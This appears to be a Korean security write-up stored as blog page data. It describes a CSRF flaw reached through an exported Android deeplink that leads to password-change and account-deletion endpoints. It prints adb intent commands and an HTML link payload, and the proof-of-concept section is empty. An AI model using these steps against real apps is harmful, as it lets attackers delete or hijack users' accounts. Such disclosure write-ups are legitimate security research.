{"pageProps":{"post":{"title":"CSRF로 인해 계정이 삭제될 수 있습니다","description":"","date":"2024-05-23 14:47","slug":"2024-05-23-CSRFLeadstoDeleteAccount","content":"\n# 안녕하세요!\n\n![이미지](/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png)\n\n# 소개\n\n- 대상: 안드로이드 애플리케이션\n- 날짜: 2024년 5월\n- 요약: Corp 앱에서 CSRF 취약점을 발견했습니다. 이 취약점을 이용하여 사용자 계정을 삭제할 수 있는 Deeplink와 delete-account 엔드포인트 간의 상호작용이 가능합니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 복제 단계\n\n- 먼저 AndroidMainfast.xml을 살펴봅니다.\n\n```xml\n        <activity android:theme=\"@style/Theme.Thredup.Splash\" android:name=\"com.example.android.feature.splash.SplashActivity\" android:exported=\"true\" android:launchMode=\"singleTask\" android:screenOrientation=\"behind\" android:configChanges=\"screenSize|orientation\" android:noHistory=\"true\">\n            <intent-filter android:autoVerify=\"true\">\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:host=\"www.example.com\" android:pathPrefix=\"/account\"/>\n                <data android:scheme=\"https\"/>\n                <data android:scheme=\"http\"/>\n            </intent-filter>\n        </activity>\n```\n\n- 'adb'를 사용하여 호출한 후에 /account/라는 Path로 이 Deeplink를 발견했습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- 지금은 설정에 있어요;\n- 잠시만 android:pathPrefix=/account/는 무슨 의미일까요?\n- android:pathPrefix 속성은 Intent 객체의 경로의 초기 부분에만 일치하는 부분 경로를 지정합니다. 그래서 아마도 /account/ 뒤에 무언가를 찾을 수 있을지도 모릅니다.\n- 설정 이후에 API 호출을 가로챈 후, 비밀번호 변경이나 계정 삭제와 같은 설정 후의 API 엔드포인트를 Deeplink에서 사용해 봅시다.\n\n```js\nadb shell am start -a android.intent.action.VIEW -n com.thredup.android/com.thredup.android.feature.splash.SplashActivity -d \"https://www.example.com/account/change_password\"\n\nadb shell am start -a android.intent.action.VIEW -n com.thredup.android/com.thredup.android.feature.splash.SplashActivity -d \"https://www.example.com/account/delete_password\"\n```\n\n- 지금 CSRF로 만들어 봐요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```javascript\n<!DOCTYPE html>\n<html>\n<a href=\"https://www.example.com/account/change_password\">CSRF DEMO</a>\n</html>\n```\n\n# Proof of Concept\n","ogImage":{"url":"/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png"},"coverImage":"/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png","tag":["Tech"],"readingTime":3},"content":"<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta content=\"width=device-width, initial-scale=1\" name=\"viewport\">\n</head>\n<body>\n<h1>안녕하세요!</h1>\n<p><img src=\"/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png\" alt=\"이미지\"></p>\n<h1>소개</h1>\n<ul>\n<li>대상: 안드로이드 애플리케이션</li>\n<li>날짜: 2024년 5월</li>\n<li>요약: Corp 앱에서 CSRF 취약점을 발견했습니다. 이 취약점을 이용하여 사용자 계정을 삭제할 수 있는 Deeplink와 delete-account 엔드포인트 간의 상호작용이 가능합니다.</li>\n</ul>\n<p></p>\n<h1>복제 단계</h1>\n<ul>\n<li>먼저 AndroidMainfast.xml을 살펴봅니다.</li>\n</ul>\n<pre><code class=\"hljs language-xml\">        <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">activity</span> <span class=\"hljs-attr\">android:theme</span>=<span class=\"hljs-string\">\"@style/Theme.Thredup.Splash\"</span> <span class=\"hljs-attr\">android:name</span>=<span class=\"hljs-string\">\"com.example.android.feature.splash.SplashActivity\"</span> <span class=\"hljs-attr\">android:exported</span>=<span class=\"hljs-string\">\"true\"</span> <span class=\"hljs-attr\">android:launchMode</span>=<span class=\"hljs-string\">\"singleTask\"</span> <span class=\"hljs-attr\">android:screenOrientation</span>=<span class=\"hljs-string\">\"behind\"</span> <span class=\"hljs-attr\">android:configChanges</span>=<span class=\"hljs-string\">\"screenSize|orientation\"</span> <span class=\"hljs-attr\">android:noHistory</span>=<span class=\"hljs-string\">\"true\"</span>></span>\n            <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">intent-filter</span> <span class=\"hljs-attr\">android:autoVerify</span>=<span class=\"hljs-string\">\"true\"</span>></span>\n                <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">action</span> <span class=\"hljs-attr\">android:name</span>=<span class=\"hljs-string\">\"android.intent.action.VIEW\"</span>/></span>\n                <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">category</span> <span class=\"hljs-attr\">android:name</span>=<span class=\"hljs-string\">\"android.intent.category.DEFAULT\"</span>/></span>\n                <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">category</span> <span class=\"hljs-attr\">android:name</span>=<span class=\"hljs-string\">\"android.intent.category.BROWSABLE\"</span>/></span>\n                <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">data</span> <span class=\"hljs-attr\">android:host</span>=<span class=\"hljs-string\">\"www.example.com\"</span> <span class=\"hljs-attr\">android:pathPrefix</span>=<span class=\"hljs-string\">\"/account\"</span>/></span>\n                <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">data</span> <span class=\"hljs-attr\">android:scheme</span>=<span class=\"hljs-string\">\"https\"</span>/></span>\n                <span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">data</span> <span class=\"hljs-attr\">android:scheme</span>=<span class=\"hljs-string\">\"http\"</span>/></span>\n            <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">intent-filter</span>></span>\n        <span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">activity</span>></span>\n</code></pre>\n<ul>\n<li>'adb'를 사용하여 호출한 후에 /account/라는 Path로 이 Deeplink를 발견했습니다.</li>\n</ul>\n<p></p>\n<ul>\n<li>지금은 설정에 있어요;</li>\n<li>잠시만 android:pathPrefix=/account/는 무슨 의미일까요?</li>\n<li>android:pathPrefix 속성은 Intent 객체의 경로의 초기 부분에만 일치하는 부분 경로를 지정합니다. 그래서 아마도 /account/ 뒤에 무언가를 찾을 수 있을지도 모릅니다.</li>\n<li>설정 이후에 API 호출을 가로챈 후, 비밀번호 변경이나 계정 삭제와 같은 설정 후의 API 엔드포인트를 Deeplink에서 사용해 봅시다.</li>\n</ul>\n<pre><code class=\"hljs language-js\">adb shell am start -a android.<span class=\"hljs-property\">intent</span>.<span class=\"hljs-property\">action</span>.<span class=\"hljs-property\">VIEW</span> -n com.<span class=\"hljs-property\">thredup</span>.<span class=\"hljs-property\">android</span>/com.<span class=\"hljs-property\">thredup</span>.<span class=\"hljs-property\">android</span>.<span class=\"hljs-property\">feature</span>.<span class=\"hljs-property\">splash</span>.<span class=\"hljs-property\">SplashActivity</span> -d <span class=\"hljs-string\">\"https://www.example.com/account/change_password\"</span>\n\nadb shell am start -a android.<span class=\"hljs-property\">intent</span>.<span class=\"hljs-property\">action</span>.<span class=\"hljs-property\">VIEW</span> -n com.<span class=\"hljs-property\">thredup</span>.<span class=\"hljs-property\">android</span>/com.<span class=\"hljs-property\">thredup</span>.<span class=\"hljs-property\">android</span>.<span class=\"hljs-property\">feature</span>.<span class=\"hljs-property\">splash</span>.<span class=\"hljs-property\">SplashActivity</span> -d <span class=\"hljs-string\">\"https://www.example.com/account/delete_password\"</span>\n</code></pre>\n<ul>\n<li>지금 CSRF로 만들어 봐요.</li>\n</ul>\n<p></p>\n<pre><code class=\"hljs language-javascript\">&#x3C;!<span class=\"hljs-variable constant_\">DOCTYPE</span> html>\n<span class=\"xml\"><span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">html</span>></span>\n<span class=\"hljs-tag\">&#x3C;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"https://www.example.com/account/change_password\"</span>></span>CSRF DEMO<span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">a</span>></span>\n<span class=\"hljs-tag\">&#x3C;/<span class=\"hljs-name\">html</span>></span></span>\n</code></pre>\n<h1>Proof of Concept</h1>\n</body>\n</html>\n"},"__N_SSG":true}